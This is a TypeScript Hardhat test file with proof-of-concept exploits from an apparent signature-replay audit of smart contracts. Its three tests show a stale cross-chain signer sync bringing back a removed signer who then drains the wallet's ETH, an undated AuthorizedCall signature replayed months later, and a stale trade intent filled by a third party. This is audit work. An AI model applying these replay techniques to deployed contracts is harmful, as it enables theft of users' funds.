import { expect } from "chai";
import hre from "hardhat";
import { Contract } from "ethers";
import {
  connection,
  ethers,
  deployer,
  owner,
  signer1,
  signer2,
  signer3,
} from "../../../test/TestBase.ts";
import { deployFixture, ZCHF_ADDRESS } from "../../../test/Fixtures.ts";
import KEYS from "../../../KEYS.ts";

// Signature-replay audit (2026-08-11) — proof-of-concept tests.
//
//   Finding 1 — MultichainWallet._ccipReceive: signer syncs carry no sequence number and
//               `allowOutOfOrderExecution: true` is set (MultichainWallet.sol:25-36, 63-67).
//               A stale signer-list snapshot that arrives *after* a removal re-applies the
//               removed signer, resurrecting them on the destination chain. Demonstrated on a
//               dedicated chainId-31337 network (the destination guard reverts on chainId 1).
//   Finding 2 — AuthorizedExecutor.execute: AuthorizedCall has no deadline (AuthorizedExecutor.sol:32-40,
//               AuthorizedCallVerifier.sol:44-52). A captured signature remains executable at any
//               future time; contractNonce is the only guard and the signer has no revocation.
//   Finding 3 — TradeReactor intents: no nonce/version, `creation` is unvalidated and
//               `cancelIntent` is only a race (TradeReactor.sol:118-163). A signed intent is a
//               cheque that stays live for its whole validity window and is not invalidated by a
//               newer intent from the same owner.

const MAINNET_CHAIN_SELECTOR = 5009297550715157269n; // MultichainWallet.MAINNET_CHAIN_SELECTOR

// ---------------------------------------------------------------------------
// Finding 1 — MultichainWallet: stale/out-of-order signer sync resurrects a removed signer
// ---------------------------------------------------------------------------
describe("Finding 1 — MultichainWallet._ccipReceive: out-of-order signer sync resurrects a removed signer", function () {
  let net: any;
  let router: Contract;
  let wallet: Contract;
  let harness: Contract;
  let deployer2: any;
  let alice: any;
  let bob: any;

  async function syncSigners(list: string[], powers: number[]) {
    const walletAddr = await wallet.getAddress();
    const message = {
      messageId: ethers.id("sync-" + list.join("-") + "-" + powers.join("-")),
      sourceChainSelector: MAINNET_CHAIN_SELECTOR,
      sender: ethers.AbiCoder.defaultAbiCoder().encode(
        ["address"],
        [walletAddr]
      ),
      data: ethers.AbiCoder.defaultAbiCoder().encode(
        ["address[]", "uint8[]"],
        [list, powers]
      ),
      destTokenAmounts: [],
    };
    await router.deliver(message, walletAddr);
  }

  before(async function () {
    // Dedicated network: _ccipReceive reverts on chainId == 1 ("InvalidDestinationChain"),
    // so the destination wallet must live on a non-mainnet chain.
    net = await hre.network.create({
      override: { chainId: 31337, forking: undefined },
    });
    [deployer2, , alice, bob] = await net.ethers.getSigners();

    const MockCCIPRouter = await net.ethers.getContractFactory(
      "contracts/mocks/audit/agents/MockCCIPRouter.sol:MockCCIPRouter"
    );
    router = await MockCCIPRouter.deploy();
    await router.waitForDeployment();

    const ArgSource = await net.ethers.getContractFactory(
      "contracts/multisig/MultichainWalletArgumentSource.sol:MultichainWalletArgumentSource"
    );
    const argSource = await ArgSource.deploy();
    await argSource.waitForDeployment();
    await argSource.initialize(await router.getAddress());

    const Master = await net.ethers.getContractFactory(
      "contracts/multisig/MultiSigWalletMaster.sol:MultiSigWalletMaster"
    );
    wallet = await Master.deploy(await argSource.getAddress());
    await wallet.waitForDeployment();
    // Deliberately NOT initialized: on the destination chain the signer set is driven purely
    // by the mainnet syncs, so the initial owner signer would only skew signerCount assertions.

    const Harness = await net.ethers.getContractFactory(
      "contracts/mocks/audit/agents/MultisigHashHarness.sol:MultisigHashHarness"
    );
    harness = await Harness.deploy();
    await harness.waitForDeployment();
  });

  after(async function () {
    await net.close();
  });

  it("stale snapshot delivered after the removal re-applies the removed signer", async function () {
    const aliceAddr = await alice.getAddress();
    const bobAddr = await bob.getAddress();
    expect(await wallet.signers(aliceAddr)).to.equal(0);
    expect(await wallet.signers(bobAddr)).to.equal(0);

    // t0: mainnet snapshot [alice=1, bob=1] is broadcast (in-flight, delayed).
    await syncSigners([aliceAddr, bobAddr], [1, 1]);
    expect(await wallet.signers(aliceAddr)).to.equal(1);
    expect(await wallet.signers(bobAddr)).to.equal(1);

    // t1: bob is removed on mainnet; the removal sync arrives FIRST.
    await syncSigners([aliceAddr, bobAddr], [1, 0]);
    expect(await wallet.signers(aliceAddr)).to.equal(1);
    expect(await wallet.signers(bobAddr)).to.equal(0);
    expect(await wallet.signerCount()).to.equal(1);

    // t2: the stale t0 snapshot is delivered out of order (allowOutOfOrderExecution: true).
    // _ccipReceive applies it unconditionally -> bob is back with full power.
    await syncSigners([aliceAddr, bobAddr], [1, 1]);
    expect(await wallet.signers(bobAddr)).to.equal(1);
    expect(await wallet.signerCount()).to.equal(2);
  });

  it("EXPLOIT: the resurrected signer alone moves the wallet's ETH", async function () {
    const bobAddr = await bob.getAddress();
    const value = ethers.parseEther("1");

    // Fund the wallet.
    await deployer2.sendTransaction({ to: await wallet.getAddress(), value });
    const walletBalance = await net.ethers.provider.getBalance(
      await wallet.getAddress()
    );
    expect(walletBalance).to.equal(value);

    // Build a real multisig transaction: wallet -> bob, value 1 ETH, empty data.
    const nonce = await wallet.nextNonce();
    const id = await wallet.contractId();
    const hash = await harness.getTransactionHash(
      nonce,
      id,
      bobAddr,
      value,
      "0x"
    );

    // The multisig hash is keccak(RLP(...)) signed RAW — no EIP-191 personal-message prefix.
    // ethers' signMessage would add the prefix and corrupt the digest, so sign via signingKey.
    const mnemonic = ethers.Mnemonic.fromPhrase(KEYS.mnemonics.mainnet);
    const bobSigner = ethers.HDNodeWallet.fromMnemonic(
      mnemonic,
      "m/44'/60'/0'/0/3"
    );
    expect(bobSigner.address).to.equal(bobAddr);
    const sig = bobSigner.signingKey.sign(hash);
    const { v, r, s } = sig;

    // Bob's signature alone is accepted by the (resurrected) signer set.
    const signers = await wallet.checkSignatures(
      nonce,
      bobAddr,
      value,
      "0x",
      [v],
      [r],
      [s]
    );
    expect(signers[0]).to.equal(bobAddr);

    // And the transaction executes.
    const bobBefore = await net.ethers.provider.getBalance(bobAddr);
    await wallet.execute(nonce, bobAddr, value, "0x", [v], [r], [s]);
    const bobAfter = await net.ethers.provider.getBalance(bobAddr);
    expect(bobAfter - bobBefore).to.equal(value);
  });
});

// ---------------------------------------------------------------------------
// Finding 2 — AuthorizedExecutor: signed AuthorizedCall has no deadline
// ---------------------------------------------------------------------------
describe("Finding 2 — AuthorizedExecutor.execute: no deadline — a captured AuthorizedCall stays executable forever", function () {
  let authorizedExecutor: Contract;
  let tradeReactor: Contract;
  let zchf: Contract;

  beforeEach(async function () {
    ({ authorizedExecutor, tradeReactor, zchf } = await deployFixture());
  });

  function getEIP712Fields(call: any, verifyingContract: string) {
    const domain = {
      name: "AuthorizedCall",
      version: "1",
      chainId: connection.networkConfig.chainId,
      verifyingContract,
      salt: ethers.keccak256(ethers.toUtf8Bytes("aktionariat")),
    };
    const types = {
      AuthorizedCall: [
        { name: "nonce", type: "uint256" },
        { name: "to", type: "address" },
        { name: "functionSignature", type: "string" },
        { name: "value", type: "uint256" },
        { name: "data", type: "bytes" },
      ],
    };
    return { domain, types, message: call };
  }

  async function signApprove(signer: any, amount: bigint) {
    const signerAddr = await signer.getAddress();
    const signerAsContract = await connection.ethers.getContractAt(
      "AuthorizedExecutor",
      signerAddr
    );
    const functionToCall = new connection.ethers.Interface([
      "function approve(address spender, uint256 amount) external returns (bool)",
    ]);
    const encodedCall = functionToCall.encodeFunctionData("approve", [
      await tradeReactor.getAddress(),
      amount,
    ]);

    const nonce = await signer.getNonce();
    const auth = await signer.authorize({
      address: await authorizedExecutor.getAddress(),
      nonce,
    });
    const contractNonce = await signerAsContract["contractNonce"]({
      type: 4,
      authorizationList: [auth],
    });

    const call = {
      nonce: contractNonce,
      to: ZCHF_ADDRESS,
      functionSignature: "approve(address,uint256)",
      value: 0n,
      data: encodedCall,
    };
    const { domain, types, message } = getEIP712Fields(call, signerAddr);
    const signature = await signer.signTypedData(domain, types, message);
    return { auth, call, signature, signerAsContract };
  }

  it("EXPLOIT: an AuthorizedCall signed 'now' executes months later without any revocation", async function () {
    const amount = ethers.parseUnits("1000", 18);
    const signerAddr = await signer1.getAddress();
    const { auth, call, signature, signerAsContract } = await signApprove(
      signer1,
      amount
    );

    // The signer never executes anything. Months pass (simulating a captured/abandoned signature).
    await connection.networkHelpers.time.increase(180n * 24n * 3600n);

    // The stale signature is still perfectly valid — only `contractNonce` guards it, and it never moved.
    await signerAsContract.connect(deployer).execute(call, signature, {
      value: 0n,
      type: 4,
      authorizationList: [auth],
    });

    const allowance = await zchf.allowance(
      signerAddr,
      await tradeReactor.getAddress()
    );
    expect(allowance).to.equal(amount);

    // The nonce is now consumed — the only thing that stopped the replay was nonce, not time.
    // It must have advanced by exactly one from the value that was signed (the EOA's storage
    // persists across test files on the shared network, so assert the delta, not an absolute).
    expect(await signerAsContract.contractNonce()).to.equal(call.nonce + 1n);
    await expect(
      signerAsContract.connect(deployer).execute(call, signature, {
        value: 0n,
        type: 4,
        authorizationList: [auth],
      })
    ).to.revert(ethers);
  });
});

// ---------------------------------------------------------------------------
// Finding 3 — TradeReactor intents: no nonce — stale intent live for the whole window
// ---------------------------------------------------------------------------
describe("Finding 3 — TradeReactor intents: no nonce — a stale intent is executable at any time in its window and survives newer intents", function () {
  let reactor: Contract;
  let shareToken: Contract;
  let currency: Contract;
  const now = async () => BigInt(await connection.networkHelpers.time.latest());

  function eip712Domain(verifyingContract: string) {
    return {
      domain: {
        name: "TradeIntent",
        version: "1",
        chainId: connection.networkConfig.chainId,
        verifyingContract,
        salt: ethers.keccak256(ethers.toUtf8Bytes("aktionariat")),
      },
      types: {
        Intent: [
          { name: "owner", type: "address" },
          { name: "filler", type: "address" },
          { name: "tokenOut", type: "address" },
          { name: "amountOut", type: "uint256" },
          { name: "tokenIn", type: "address" },
          { name: "amountIn", type: "uint256" },
          { name: "creation", type: "uint256" },
          { name: "expiration", type: "uint256" },
          { name: "data", type: "bytes" },
        ],
      },
    };
  }

  async function signIntent(signer: any, intent: any) {
    const { domain, types } = eip712Domain(await reactor.getAddress());
    return signer.signTypedData(domain, types, intent);
  }

  async function deployToken(symbol: string): Promise<Contract> {
    const Shares = await ethers.getContractFactory(
      "contracts/shares/base/Shares.sol:Shares"
    );
    const t = await Shares.deploy(
      symbol,
      symbol,
      "https://poc.example/terms",
      await owner.getAddress()
    );
    await t.waitForDeployment();
    return t as unknown as Contract;
  }

  beforeEach(async function () {
    reactor = await (
      await ethers.getContractFactory(
        "contracts/market/TradeReactor.sol:TradeReactor"
      )
    ).deploy();
    await reactor.waitForDeployment();
    shareToken = await deployToken("SH");
    currency = await deployToken("CHF");

    const shareDec = 0n;
    const curDec = 18n;
    const [seller, buyer] = [signer2, signer1];
    await shareToken
      .connect(owner)
      .mint(await seller.getAddress(), 20n * 10n ** shareDec);
    await currency
      .connect(owner)
      .mint(await buyer.getAddress(), 1000n * 10n ** curDec);
    await (shareToken.connect(seller) as Contract).approve(
      await reactor.getAddress(),
      20n * 10n ** shareDec
    );
    await (currency.connect(buyer) as Contract).approve(
      await reactor.getAddress(),
      1000n * 10n ** curDec
    );
  });

  it("EXPLOIT: an old intent is filled long after signing and after the owner signed a better one", async function () {
    const [seller, buyer, attacker] = [signer2, signer1, signer3];
    const shareDec = 0n;
    const curDec = 18n;
    const sellerAddr = await seller.getAddress();
    const buyerAddr = await buyer.getAddress();
    const shareAddr = await shareToken.getAddress();
    const curAddr = await currency.getAddress();
    const t0 = await now();

    // Seller intent A: sell 20 shares for 200 currency. Public (filler = 0), valid 1 hour.
    const intentA = {
      owner: sellerAddr,
      filler: ethers.ZeroAddress,
      tokenOut: shareAddr,
      amountOut: 20n * 10n ** shareDec,
      tokenIn: curAddr,
      amountIn: 200n * 10n ** curDec,
      creation: t0,
      expiration: t0 + 3600n,
      data: "0x",
    };
    const sigA = await signIntent(seller, intentA);
    const buyerIntent = {
      owner: buyerAddr,
      filler: ethers.ZeroAddress,
      tokenOut: curAddr,
      amountOut: 200n * 10n ** curDec,
      tokenIn: shareAddr,
      amountIn: 20n * 10n ** shareDec,
      creation: t0,
      expiration: t0 + 3600n,
      data: "0x",
    };
    const buyerSig = await signIntent(buyer, buyerIntent);

    // Half an hour later the seller signs a NEW intent at a better price (20 shares for 300).
    // There is no nonce, so signing intent B does nothing to intent A.
    await connection.networkHelpers.time.increase(30n * 60n);
    const intentB = {
      ...intentA,
      amountIn: 300n * 10n ** curDec,
      creation: await now(),
    };
    await signIntent(seller, intentB);

    // Anyone (the attacker) can still fill the STALE intent A with the buyer:
    // execution time inside the window is attacker-chosen and no revocation is required.
    await reactor
      .connect(attacker)
      .process(intentA, sigA, buyerIntent, buyerSig, 20n * 10n ** shareDec, 0n);

    expect(await shareToken.balanceOf(buyerAddr)).to.equal(
      20n * 10n ** shareDec
    );
    expect(await currency.balanceOf(sellerAddr)).to.equal(200n * 10n ** curDec);

    // Post-hoc revocation is impossible: cancelIntent can still flip the flag, but it cannot
    // undo the executed transfer. The seller's only protection is winning a mempool race
    // against the filler for the entire validity window.
    await reactor.connect(seller).cancelIntent(intentA);
    expect(await shareToken.balanceOf(buyerAddr)).to.equal(
      20n * 10n ** shareDec
    );
  });
});
